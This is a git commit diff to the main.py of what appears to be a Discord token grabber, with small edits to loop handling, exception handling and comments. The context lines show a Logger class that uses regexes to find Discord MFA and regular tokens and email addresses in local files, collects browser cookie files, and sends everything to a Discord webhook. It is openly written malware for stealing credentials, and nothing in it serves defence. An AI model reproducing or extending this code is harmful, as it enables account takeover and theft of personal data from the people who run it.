7beb2c3821e767b331a2fcc5c9f351b578588f77
LittleDyingDuck <51399074+LittleDyingDuck@users.noreply.github.com>
2021-07-13 12:22:16 +1000

    Update main.py
    Removing loop.close() causing an unnecessary error.

--- main.py
+++ main.py
@@ -1,4 +1,3 @@
-
 import os
 import re
 import discord
@@ -8,7 +7,7 @@ import requests
 
 
 class Logger:
-    def __init__(self, webhook): # Ignore this, this is for the class. If you wish to set your webhook look at the very bottom of the script.
+    def __init__(self, webhook):
         self.MFA_Regex = re.compile(r"mfa\.[\w-]{84}")
         self.Regular_Regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
         self.Email_Regex = re.compile(r"""(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])""")
@@ -31,7 +30,7 @@ class Logger:
         self.init_scan()
         loop = asyncio.get_event_loop()
         loop.run_until_complete(self.send())
-        loop.close()
+
 
     def scan_path_files_for_token(self, path):
         if os.path.isdir(path):
@@ -48,8 +47,8 @@ class Logger:
                         if email:
                             self.Emails.append(email[0])
 
-                except BaseException:
-                    pass
+                except PermissionError:
+                    print("Permission error! (Ignored)")
 
     def init_scan(self):
         # Vanilla
@@ -87,7 +86,7 @@ class Logger:
                 await w.send(embed=Beta_Cookies, file=self.Beta_Cookies_File)
             elif self.Cookies_Found:
                 await w.send(embed=Vanilla_Cookies, file=self.Cookies_File)
-            elif self.Emails: # This is garbage and not worth having. The check doesn't even work but who gives cares.
+            elif self.Emails: # This check doesn't actually work and idk why so deal with it
                 file = open("Found_Emails.txt", "w+")
                 file.write("\n".join(self.Emails))
                 await w.send(file=discord.File(file))
@@ -95,4 +94,5 @@ class Logger:
 
             await w.send(embed=Token_Embed)
 
-Logger("Webhook Here").start()
+
+Logger("Webhook").start()
